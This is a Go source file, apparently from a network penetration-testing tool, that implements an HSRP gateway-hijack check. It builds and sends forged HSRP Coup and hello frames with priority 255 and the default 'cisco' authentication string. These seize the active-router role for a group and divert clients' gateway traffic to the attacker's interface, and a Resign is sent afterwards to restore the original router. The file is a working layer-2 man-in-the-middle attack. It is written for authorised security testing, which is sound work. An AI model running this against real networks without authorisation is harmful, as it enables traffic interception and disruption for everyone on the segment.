// hsrp.go implements the HSRP active-router hijack check. Impact
// temporary, restore active, affects clients: the Coup (opcode 1,
// priority 255) and the hellos that follow take the active router role
// for the group, so the clients' gateway traffic goes to the attack leg,
// and the armed Resign (opcode 2) hands the role back when the run ends.

package fh

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net"
	"time"

	"github.com/gopacket/gopacket/layers"

	"go.aledante.io/FlowSeer/src/common/errs"

	"go.aledante.io/FlowSeer/src/edge/netpen/check"
	nl "go.aledante.io/FlowSeer/src/edge/netpen/layers"
	"go.aledante.io/FlowSeer/src/edge/netpen/link"
)

// The HSRP timers the check runs on: the hello interval and the hold time
// RFC 2281 section 5.1 defaults, and the shortest window that holds one
// pre-read and one hello interval after the coup.
const (
	hsrpHellotime = 3 * time.Second
	hsrpHoldtime  = 10 * time.Second
	hsrpMinWindow = 2 * hsrpHellotime
)

type hsrpFinding struct {
	Action   string `json:"action"`
	Opcode   string `json:"opcode"`
	Group    uint8  `json:"group"`
	Priority uint8  `json:"priority"`
	VIP      string `json:"vip"`
	Restore  string `json:"restore"`
}

// RunHSRP reads the leg for one hello interval for a hello from another
// sender for the target's group in state Active, then arms the Resign,
// sends the Coup, and sends a hello every hello interval until the window
// ends or the predicate matches. The group is bounded at 255, the one
// octet the HSRPv1 group field holds, so a larger group is the operator's
// mistake and not another group. The priority of 255 and the
// authentication string are probe content. The predicate is what the
// active router does after the Coup: a Resign from it, or a hello from it
// in a state other than Active, confirms (RFC 2281 section 5.7, event j in
// Active: send Resign, move to Speak), and so does its silence for one hold
// time. A hello from it still in state Active at the window's end is
// resisted. No Active hello in the pre-read is pending, since there is no
// router to depose, and a window under 6 s is pending naming the window
// to pass. Craft and send errors carry operation context.
func RunHSRP(ctx context.Context, deps check.Deps) (check.Verdict, error) {
	if err := deps.Target.Need(check.FieldGroup, check.FieldVirtualIP); err != nil {
		return check.Verdict{}, err
	}
	if err := deps.Target.Within(check.FieldGroup, 255); err != nil {
		return check.Verdict{}, err
	}
	if deps.Observe < hsrpMinWindow {
		return check.Pending(fmt.Sprintf("the window %s is shorter than the %s the check needs: pass --observe 15s", deps.Observe, hsrpMinWindow)), nil
	}
	addr := deps.AttackLeg.Addr()
	group := uint8(*deps.Target.Group)
	priority := uint8(255)
	vip := deps.Target.VirtualIP

	// Arm the resign teardown before the first frame and before the
	// pre-read: an actively restored behavior arms a step on every path
	// the runner runs its teardown on, and a Resign for a group the leg
	// never took is ignored by the group's routers (RFC 2281 section 5.7
	// acts only on a Resign from the active router).
	resignPkt, err := craftHSRP(addr, nl.HSRPOpcodeResign, nl.HSRPStateStandby, priority, group, vip)
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "hsrp: craft resign")
	}
	deps.Teardown.Arm("hsrp-resign", func(ctx context.Context) error {
		return deps.AttackLeg.Send(ctx, resignPkt)
	})

	// The pre-read: the active router's hello is what the coup changes.
	var router net.HardwareAddr
	_, pre, err := check.First(ctx, deps.AttackLeg, min(hsrpHellotime, deps.Observe), func(data []byte) bool {
		msg, from, ok := isHSRPFor(data, group, addr.MAC)
		if !ok || msg.Opcode != nl.HSRPOpcodeHello || msg.State != nl.HSRPStateActive {
			return false
		}
		router = from
		return true
	})
	if err != nil {
		if ctx.Err() != nil {
			return check.Verdict{}, ctx.Err()
		}
		return check.Verdict{}, errs.Wrap(err, "hsrp: receive hello")
	}
	if router == nil {
		return check.Pending(fmt.Sprintf("no active router for group %d in %s", group, pre.Elapsed.Round(time.Millisecond))), nil
	}

	coupPkt, err := craftHSRP(addr, nl.HSRPOpcodeCoup, nl.HSRPStateActive, priority, group, vip)
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "hsrp: craft coup")
	}
	helloPkt, err := craftHSRP(addr, nl.HSRPOpcodeHello, nl.HSRPStateActive, priority, group, vip)
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "hsrp: craft hello")
	}

	couped := false
	lastSeen := time.Now()
	var yielded string
	found, obs, err := check.Sustain(ctx, deps.AttackLeg, deps.Observe-pre.Elapsed, hsrpHellotime,
		func(ctx context.Context) error {
			if !couped {
				if err := deps.AttackLeg.Send(ctx, coupPkt); err != nil {
					return errs.Wrap(err, "hsrp: send coup")
				}
				couped = true
			}
			if err := deps.AttackLeg.Send(ctx, helloPkt); err != nil {
				return errs.Wrap(err, "hsrp: send hello")
			}
			return nil
		},
		func(data []byte) bool {
			msg, from, ok := isHSRPFor(data, group, addr.MAC)
			if !ok || !bytes.Equal(from, router) {
				return false
			}
			lastSeen = time.Now()
			switch {
			case msg.Opcode == nl.HSRPOpcodeResign:
				yielded = "sent a Resign"
			case msg.Opcode == nl.HSRPOpcodeHello && msg.State != nl.HSRPStateActive:
				yielded = fmt.Sprintf("left the active state for state %d", msg.State)
			default:
				return false
			}
			return true
		})
	if err != nil {
		if ctx.Err() != nil {
			return check.Verdict{}, ctx.Err()
		}
		return check.Verdict{}, errs.Wrap(err, "hsrp: receive after the coup")
	}

	detail, _ := json.Marshal(hsrpFinding{
		Action:   "hsrp-coup",
		Opcode:   "coup",
		Group:    group,
		Priority: priority,
		VIP:      vip.String(),
		Restore:  "hsrp-resign",
	})
	deps.Emitter.Finding("hsrp", detail)

	observed := pre.Elapsed + obs.Elapsed
	switch {
	case found != nil:
		return check.Confirmed(fmt.Sprintf("the active router for group %d %s after the coup", group, yielded), observed), nil
	case time.Since(lastSeen) >= hsrpHoldtime:
		return check.Confirmed(fmt.Sprintf("the active router for group %d fell silent for the %s hold time after the coup", group, hsrpHoldtime), observed), nil
	}
	return check.Resisted(fmt.Sprintf("the active router for group %d still sends hellos in state active", group), observed), nil
}

// craftHSRP builds a full HSRP frame: Ethernet → IPv4 → UDP(1985) → HSRP.
func craftHSRP(addr link.Addr, opcode nl.HSRPOpcode, state nl.HSRPState, priority, group uint8, vip net.IP) ([]byte, error) {
	eth := &layers.Ethernet{
		DstMAC:       hsrpDstMAC,
		SrcMAC:       addr.MAC,
		EthernetType: layers.EthernetTypeIPv4,
	}
	ip := &layers.IPv4{
		Version:  4,
		IHL:      5,
		TTL:      1,
		Protocol: layers.IPProtocolUDP,
		SrcIP:    addr.IPv4,
		DstIP:    net.IPv4(224, 0, 0, 2),
	}
	udp := &layers.UDP{
		SrcPort: 1985,
		DstPort: 1985,
	}
	hsrp := &nl.HSRP{
		Version:   0,
		Opcode:    opcode,
		State:     state,
		Hellotime: 3,
		Holdtime:  10,
		Priority:  priority,
		Group:     group,
		Auth:      [8]byte{'c', 'i', 's', 'c', 'o', 0, 0, 0},
		VirtualIP: vip.To4(),
	}
	return craftUDPLayer(eth, ip, udp, hsrp)
}
